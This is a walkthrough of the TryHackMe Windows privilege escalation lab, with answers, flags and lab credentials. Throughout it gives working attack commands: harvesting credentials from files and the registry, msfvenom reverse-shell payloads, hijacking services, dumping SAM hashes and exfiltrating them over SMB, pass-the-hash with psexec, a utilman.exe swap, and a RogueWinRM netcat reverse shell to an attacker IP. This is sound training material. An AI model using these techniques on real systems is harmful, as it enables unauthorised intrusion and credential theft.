# [Windows Privilege Escalation](https://tryhackme.com/r/room/windowsprivesc20)

![WindowsPrivilegeEscalation](./images/WindowsPrivilegeEscalation.png)

Learn the fundamentals of Windows privilege escalation techniques.

## Task 1 - Introduction

During a penetration test, you will often have access to some Windows hosts with an unprivileged user. Unprivileged users will hold limited access, including their files and folders only, and have no means to perform administrative tasks on the host, preventing you from having complete control over your target.

This room covers fundamental techniques that attackers can use to elevate privileges in a Windows environment, allowing you to use any initial unprivileged foothold on a host to escalate to an administrator account, where possible.

If you want to brush up on your skills first, you can have a look through the [Windows Fundamentals Module](https://tryhackme.com/module/windows-fundamentals) or the [Hacking Windows Module](https://tryhackme.com/module/hacking-windows-1).

### Answer the questions below

* Click and continue learning!

## Task 2 - Windows Privilege Escalation

Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.

Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:

* Misconfigurations on Windows services or scheduled tasks
* Excessive privileges assigned to our account
* Vulnerable software
* Missing Windows security patches

Before jumping into the actual techniques, let's look at the different account types on a Windows system.

### Windows Users

Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:

|Type|Description|
|----|-----------|
|**Administrators**|These users have the most privileges. They can change any system configuration parameter and access any file in the system.|
|**Standard Users**|These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.|

Any user with administrative privileges will be part of the **Administrators** group. On the other hand, standard users are part of the **Users** group.

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:

|Type|Description|
|----|-----------|
|**SYSTEM / LocalSystem**|An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.|
|**Local Service**|Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.|
|**Network Service**|Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.|

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.

### Answer the questions below

* Users that can change system configurations are part of which group?

	`Administrators `

* The SYSTEM account has more privileges than the Administrator user (aye/nay)

	`Aye`
	
## Task 3 - Harvesting Passwords from Usual Spots

The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.

This task will present some known places to look for passwords on a Windows system.

Before going into the task, remember to click the **Start Machine** button. You will be using the same machine throughout tasks 3 to 5. If you are using the **AttackBox**, this is also a good moment to start it as you'll be needing it for the following tasks.

In case you prefer connecting to the target machine via RDP, you can use the following credentials:

**User**: `thm-unpriv`

**Password**: `Password321`

### Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

* C:\Unattend.xml
* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Note**: The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`. 

### Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

```
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

```
runas /savecred /user:admin cmd.exe
```

### IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

* C:\inetpub\wwwroot\web.config
* C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Note**: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

### Answer the questions below

Run RDP from kali linux

```
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$IP /u:thm-unpriv /p:'Password321'
```

![task3-RDP](./images/task3-RDP.png)

* A password for the julia.jones user has been left on the Powershell history. What is the password?

	`ZuperCkretPa5z`

	![task3-julia.jones](./images/task3-julia.jones.png)

* A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?

	`098n0x35skjD3`

	![task3-db_admin](./images/task3-db_admin.png)

* There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.

	`THM{WHAT_IS_MY_PASSWORD}`

	* Windows credential
		
		```
		cmdkey /list
		runas /savecred /user:mike.katz cmd.exe
		```

		![task3-cmdkey](./images/task3-cmdkey.png)

	* Cmd.exe run as mike.katz
		
		![task3-flag](./images/task3-flag.png)

* Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?

	`CoolPass2021`

	![task3-thom.smith](./images/task3-thom.smith.png)

## Task 4 - Other Quick Wins

Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.

### Scheduled Tasks

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

![task4-schtasks](./images/task4-schtasks.png)

You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:

![task4-icacls](./images/task4-icacls.png)

As can be seen in the result, the **BUILTIN\Users** group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:

![task4-nc](./images/task4-nc.png)

We then start a listener on the attacker machine on the same port we indicated on our reverse shell:

```
nc -lvp 4444
```

The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:

![task4-vulntask](./images/task4-vulntask.png)

And you will receive the reverse shell with taskusr1 privileges as expected:

![task4-terminal](./images/task4-terminal.png)

Go to taskusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

### AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

**Note**: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

This method requires two registry values to be set. You can query these from the command line using the commands below.

![task4-query](./images/task4-query.png)

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

![task4-malicious](./images/task4-malicious.png)

### Answer the questions below

* What is the taskusr1 flag?

	`THM{TASK_COMPLETED}`

	On target cmd.exe windows

	![task4-schtask](./images/task4-schtask.png)

	On our machine
	
	![task4-flag](./images/task4-flag.png)

## Task 5 - Abusing Service Misconfigurations

### Windows Services

Windows services are managed by the **Service Control Manager** (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:

![task5-scqc](./images/task5-scqc.png)

Here we can see that the associated executable is specified through the **BINARY_PATH_NAME** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):

![task5-apphostsvc](./images/task5-apphostsvc.png)

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:

![task5-registry](./images/task5-registry.png)

A subkey exists for every service in the system. Again, we can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a subkey called **Security**. As you have guessed by now, only administrators can modify such registry entries by default.

### Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using `sc`:

![task5-sc](./images/task5-sc.png)

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:

![task5-wservice](./images/task5-wservice.png)

And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:

![task5-kali](./images/task5-kali.png)

We can then pull the payload from Powershell with the following command:

![task5-powershell](./images/task5-powershell.png)

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:

![task5-icacls](./images/task5-icacls.png)

We start a reverse listener on our attacker machine:

![task5-nc](./images/task5-nc.png)

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:

![task5-service](./images/task5-service.png)

**Note**: PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:

![task5-shell](./images/task5-shell.png)

Go to svcusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

### Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"`, followed by the given parameters:

![task5-vnc](./images/task5-vnc.png)

**Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt**.

Now let's look at another service without proper quotation:

![task5-disk](./images/task5-disk.png)

When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

|Command|Argument 1|Argument 2|
|-------|----------|----------|
|C:\MyPrograms\Disk.exe|Sorter|Enterprise\bin\disksrs.exe|
|C:\MyPrograms\Disk Sorter.exe|Enterprise\bin\disksrs.exe|
|C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe|

This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Disk.exe` and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

While this sounds trivial, most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

In our case, the Administrator installed the Disk Sorter binaries under `c:\MyPrograms`. By default, this inherits the permissions of the `C:\` directory, which allows any user to create files and folders in it. We can check this using `icacls`:

![task5-myprogram](./images/task5-myprogram.png)

The `BUILTIN\\Users` group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:

![task5-msfvenom](./images/task5-msfvenom.png)

Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to `C:\MyPrograms\Disk.exe`. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:

![task5-move](./images/task5-move.png)

Once the service gets restarted, your payload should execute:

![task5-sorter](./images/task5-sorter.png)

As a result, you'll get a reverse shell with svcusr2 privileges:

![task5-svcusr](./images/task5-svcusr.png)

Go to svcusr2 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

### Insecure Service Permissions

You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at `C:\\tools`. The command to check for the thmservice service DACL is:

![task5-accsschk](./images/task5-accsschk.png)

Here we can see that the `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:

![task5-msfvenom2](./images/task5-msfvenom2.png)

We will then transfer the reverse shell executable to the target machine and store it in `C:\Users\thm-unpriv\rev-svc3.exe`. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:

![task5-svc3](./images/task5-svc3.png)

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):

![task5-sc-svc](./images/task5-sc-svc.png)

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:

![task5-service2](./images/task5-service2.png)

And we will receive a shell back in our attacker's machine with SYSTEM privileges:

![task5-shell2](./images/task5-shell2.png)

Go to the Administrator's desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

### Answer the questions below

* Get the flag on svcusr1's desktop.
	
	`THM{AT_YOUR_SERVICE}`

	* Query the service configuration
	
		![task5-query](./images/task5-query.png)

	* Create and download payload
	
		![task5-payload](./images/task5-payload.png)

		![task5-download](./images/task5-download.png)

	* Replace original file with our payload
	
		```
		cd C:\PROGRA~2\SYSTEM~1\
		move WService.exe WService.exe.bkp
		move C:\Users\thm-unpriv\rev-svc.exe WService.exe
		icacls WService.exe /grant Everyone:F
		```

		![task5-replace](./images/task5-replace.png)

	* Start a reverse listener on our attacker machine

		![task5-listener](./images/task5-listener.png)

	* Restart service
	
		![task5-restart](./images/task5-restart.png)

	* Get the resverse shell & the flag
	
		`type C:\Users\svcusr1\Desktop\flag.txt`

		![task5-svcusr1-flag](./images/task5-svcusr1-flag.png)

* Get the flag on svcusr2's desktop.

	`THM{QUOTES_EVERYWHERE}`

	* Chek unqouted service
	
		![task5-unqouted-service](./images/task5-unqouted-service.png)

	* Create and download payload
		
		![task5-payload2](./images/task5-payload2.png)

		![task5-download2](./images/task5-download2.png)

	* Replace original file with our payload
	
		```
		move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
		icacls C:\MyPrograms\Disk.exe /grant Everyone:F
		```

	* Start a reverse listener on our attacker machine

		![task5-listener2](./images/task5-listener2.png)

	* Restart service
	
		![task5-restart2](./images/task5-restart2.png)

	* Get the resverse shell & the flag
	
		`type C:\Users\svcusr2\Desktop\flag.txt`

		![task5-svcusr2-flag](./images/task5-svcusr2-flag.png)

* Get the flag on the Administrator's desktop.

	`THM{INSECURE_SVC_CONFIG}`

	* Create and download payload
	
		![task5-payload3](./images/task5-payload3.png)

		![task5-download3](./images/task5-download3.png)

	* Set permission and change the service's associated executable and account
	
		```
		icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
		sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
		```

		![task5-persmission](./images/task5-persmission.png)

	* Start a reverse listener on our attacker machine

		![task5-listener3](./images/task5-listener3.png)

	* Restart service 
	
		![task5-restart3](./images/task5-restart3.png)

	* Get the resverse shell & the flag
	
		`type C:\Users\Administrator\Desktop\flag.txt`

		![task5-admin-flag](./images/task5-svcusr2-flag.png)
	
## Task 6 - Abusing dangerous privileges

### Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:

```
whoami /priv
```

A complete list of available privileges on Windows systems is available [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.

While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.

### SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

Log in to the target machine via RDP using the following credentials:

**User**: `THMBackup`

**Password**: `CopyMaster555`

This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:

![task6-runas](./images/task6-runas.png)

Once on the command prompt, we can check our privileges with the following command:

![task6-priv](./images/task6-priv.png)

To backup the SAM and SYSTEM hashes, we can use the following commands:

![task6-sam](./images/task6-sam.png)

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's `smbserver.py` to start a simple SMB server with a network share in the current directory of our AttackBox:

![task6-smbserver](./images/task6-smbserver.png)

This will create a share named `public` pointing to the `share` directory, which requires the username and password of our current windows session. After this, we can use the `copy` command in our windows machine to transfer both files to our AttackBox: 

![task6-copy](./images/task6-copy.png)

And use impacket to retrieve the users' password hashes:

![task6-sercretsdump](./images/task6-sercretsdump.png)

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:

![task6-psexec](./images/task6-psexec.png)

### SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.

Log in to the target machine via RDP using the following credentials:

**User**: `THMTakeOwnership`

**Password**: `TheWorldIsMine2022`

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

![task6-runas](./images/task6-runas.png)

Once on the command prompt, we can check our privileges with the following command:

![task6-whoami](./images/task6-whoami.png)

We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

![task6-utilman](./images/task6-utilman.png)

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:

![task6-takeown](./images/task6-takeown.png)

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:

![task6-icacls](./images/task6-icacls.png)

After this, we will replace utilman.exe with a copy of cmd.exe:

![task6-copy-utilman](./images/task6-copy-utilman.png)

To trigger utilman, we will lock our screen from the start button:

![task6-lock](./images/task6-lock.png)

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

![task6-cmd](./images/task6-cmd.png)

### SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user `ftp`. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

![task6-ftp](./images/task6-ftp.png)

There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the `ftp` user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user `ftp`. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user `ftp`, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the `ftp` user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:

![task6-ftp2](./images/task6-ftp2.png)

Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user `ftp` in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

`http://MACHINE_IP/`

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:

![task6-program](./images/task6-program.png)

To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the `C:\tools\` folder.

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:

![task6-nc](./images/task6-nc.png)

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

![task6-roguewin](./images/task6-roguewin.png)

**Note**: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case. The `-a` parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442`.

If all was correctly set up, you should expect a shell with SYSTEM privileges:

![task6-terminal](./images/task6-terminal.png)

Using any of the three methods discussed in this task, gain access to the Administrator's desktop and collect the flag. Don't forget to input the flag at the end of this task.

### Answer the questions below

* Get the flag on the Administrator's desktop.

	`THM{SEFLAGPRIVILEGE}`

	#### SeBackup / SeRestore method

	* Check our privileges
	
		![task6-check](./images/task6-check.png)

	* Backup the SAM and SYSTEM hashes
	
		```
		reg save hklm\system C:\Users\THMBackup\system.hive
		reg save hklm\sam C:\Users\THMBackup\sam.hive
		```

		![task6-backup](./images/task6-backup.png)

	* Setup Impacket `smbserver.py`
	
		```
		mkdir share
		locate smbserver.py
		python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
		```

		![task6-smb](./images/task6-smb.png)

	* Copy file SAM and SYSTEM hashes from target machine to our attacker machine
	
		![task6-copy-hive](./images/task6-copy-hive.png)

	* Use Impacket `secretsdump.py` to retrieve the users' password hashes
	
		```
		python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
		```

		![task6-hases](./images/task6-hases.png)

	* Use the Administrator's hash to perform a Pass-the-Hash attack and gain access via Impacket `psexec.py`
	
		```
		python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@$IP
		```

		![task6-pass-the-hash](./images/task6-pass-the-hash.png)

	* Get the flag
	
		![task6-flag](./images/task6-flag.png)

	#### SeTakeOwnership method
	
	* Take ownership of the service's executable
	
		```
		takeown /f C:\Windows\System32\Utilman.exe
		icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
		copy cmd.exe utilman.exe
		```

		![task6-takeown-set](./images/task6-takeown-set.png)

	* Lockout and click Ease of access
	
		![task6-grantaccess](./images/task6-grantaccess.png)

	* Get the flag
		
		![task6-flag](./images/task6-flag.png)

	#### SeImpersonate / SeAssignPrimaryToken method
	
	* Open link via browsert `http://10.10.29.42`
	
		![task6-browser](./images/task6-browser.png)

	* Set listener
	
		![task6-listener](./images/task6-listener.png)

	* Run script & get shell
	
		`c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.13.52.88 7777"`

		![task6-script](./images/task6-script.png)

	* Get the flag
		
		![task6-flag](./images/task6-flag.png)

## Task 7 - Abusing vulnerable software

Make sure to click the Start Machine button before you continue, which will deploy the target machine in split-view. If you prefer connecting to the machine via RDP, you can use the following credentials:

![task7-thm](./images/task7-thm.png)

### Unpatched Software

Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the `wmic` tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):

```
wmic product get name,version,vendor
```

Remember that the `wmic product` command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.

Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) or plain old [Google](https://www.google.com/), amongst many others.

Using wmic and Google, can you find a known vulnerability on any installed product?

### Case Study: Druva inSync 6.6.3

The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12).

The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.

